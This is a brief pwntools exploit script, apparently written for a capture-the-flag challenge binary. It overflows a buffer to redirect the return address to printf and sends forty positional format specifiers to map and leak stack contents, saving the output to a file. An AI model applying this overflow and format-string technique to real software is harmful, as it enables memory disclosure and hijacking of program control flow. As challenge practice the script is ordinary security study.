from pwn import *
context.arch='amd64'; context.log_level='error'
e=ELF("./chal")
PRINTF=e.plt['printf']; MAIN=e.symbols['main']

def build(fmt, ret):
    body=(b"exit"+fmt).ljust(0x58,b"A")
    assert b"\x00" not in body
    return body+p64(ret)

# Probe positional args 1..40 to map the stack seen by printf.
p=process("./chal")
p.recvuntil(b">> ")
fmt=b"|".join(("%%%d$p"%i).encode() for i in range(1,41))
p.send(build(fmt, PRINTF))
out=p.recvall(timeout=3)
open("/work/waf_fmt_probe_out.txt","wb").write(out)
print("done", len(out))
